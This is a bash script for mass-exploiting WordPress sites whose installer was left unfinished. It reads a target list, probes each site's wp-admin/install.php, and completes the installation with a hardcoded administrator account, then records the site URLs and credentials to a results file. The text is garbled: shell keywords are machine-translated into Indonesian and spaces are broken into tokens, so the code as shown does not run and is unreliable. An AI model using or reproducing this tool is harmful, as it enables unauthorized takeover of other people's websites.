#! / bin / bash
biru = '\ 033 [34; 1m' 
ungu = '\ 033 [35; 1m' 
sian = '\ 033 [0; 36 m'
hijau = '\ e [92m'
merah = '\ 033 [0; 31m'
gas () {
       if [[$ (curl -s -H "User-Agent: Mozilla / 5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit / 537.36 (KHTML, seperti Gecko) Chrome / 44.0.2403.89 Safari / 537.36" $ site / wp- admin / install.php | grep -o 'Inggris (Amerika Serikat)') = ~ 'Inggris (Amerika Serikat)']];
      kemudian 
      echo "[+] sepertinya vuln "
      eksploitasi lokal = $ (curl --silent -H "User-Agent: Mozilla / 5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit / 537.36 (KHTML, seperti Gecko) Chrome / 44.0.2403.89 Safari / 537.36" -d "weblog_title = Wanjayy & user_name = dhit & admin_password = kun1950 & admin_password2 = kun1950 & admin_email = $ email "$ site / wp-admin / install.php? Step = 2 | grep -o '<h1> succes! </h1>')
      if [[$ exploit = ​​~ '<h1> Berhasil! </h1>']];
      kemudian
      printf "$ green [+] Succes installed! \ n"
      echo "$ site / wp-login.php" | tee -hasil_ins.txt
      echo "Nama Pengguna = dhit" | tee -hasil_ins.txt
      echo "Password = kun1950" | tee -hasil_ins.txt
      lain
      printf "$ merah [-] Gagal :( !! \ n"
      fi
     lain
    printf "$ merah [-] Not Vuln! \ n"
   fi
     }
baca -p daftar "Target Daftar Masukan:"
baca -p email "Email mu:"
untuk situs di $ (cat $ list); melakukan
      printf "$ cyan [Coba] $ site \ n"
      gas $ situs $ email
    selesai